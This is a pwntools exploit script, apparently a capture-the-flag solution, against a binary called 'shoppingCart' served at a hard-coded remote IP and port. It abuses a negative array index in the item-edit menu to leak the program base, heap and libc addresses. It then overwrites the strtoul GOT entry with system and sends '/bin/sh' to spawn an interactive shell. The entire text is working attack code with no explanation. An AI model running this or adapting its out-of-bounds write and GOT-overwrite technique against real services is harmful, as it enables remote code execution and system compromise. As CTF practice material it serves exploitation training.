from pwn import *
import sys

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

if len(sys.argv)>1:
    p = remote("49.4.79.129", 31089)
else:
    p = process("./shoppingCart")

def add(content):
    p.sendlineafter("man!", str(1))
    p.sendlineafter("Dollar?", content)

def back():
    p.sendlineafter("man!", str(3))

def menu(ix):
    p.sendlineafter("buy!", str(ix))

def buy(size,content):
    menu(1)
    p.sendlineafter("name?", str(size))
    p.sendlineafter("name?", content)

def delete(ix):
    menu(2)
    p.sendlineafter("need?", str(ix))

def edit(ix, content):
    menu(3)
    p.sendlineafter("modify?", str(ix))
    s = p.recvuntil("to?\n")
    p.send(content)
    return s

codebase = 0x555555554000

def debug():
    gdb.attach(p, "b * {}\nb *{}\nc".format(hex(codebase+0xc41),
    hex(codebase+0x0BBE)))

#debug()
add("A"*7)
back()
buy(0x18, "1234")

# leak codebase
menu(3)
s = p.sendlineafter("modify?", str(-0x2f))
p.recvuntil("like to modify ")
codebase = u64(p.recvuntil(" ", drop=True).ljust(8, "\x00"))-0x202068
log.success("codebase: "+hex(codebase))
p.sendafter("to?\n", p64(codebase+0x2021e0))

# leak heap
menu(3)
s = p.sendlineafter("modify?", str(-0x2f))
p.recvuntil("like to modify ")
heap = u64(p.recvuntil(" ", drop=True).ljust(8, "\x00"))
log.success("heap: "+hex(heap))
p.sendafter("to?\n", p64(codebase+0x202058))

# leak libc
menu(3)
s = p.sendlineafter("modify?", str(0))
p.recvuntil("like to modify ")
strtoul_libc = u64(p.recvuntil(" ", drop=True).ljust(8, "\x00"))
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc.address = strtoul_libc - libc.symbols["strtoul"]
log.success("libc: "+hex(libc.address))
p.sendafter("to?\n", p64(libc.symbols["system"]))

# get shell
p.sendlineafter("buy!", "/bin/sh")

p.interactive()
